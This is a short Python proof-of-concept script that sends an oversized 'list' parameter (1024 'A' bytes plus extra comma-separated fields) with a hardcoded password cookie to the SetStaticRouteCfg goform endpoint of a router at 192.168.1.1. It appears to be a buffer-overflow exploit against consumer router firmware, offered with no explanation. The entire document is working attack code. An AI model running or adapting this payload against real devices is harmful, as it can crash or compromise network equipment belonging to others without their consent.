import requests
def send_payload(url, payload):
    params={
            'list':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'A'*0x400+b',A,A,A'
url="http://192.168.1.1/goform/SetStaticRouteCfg"
send_payload(url, payload)   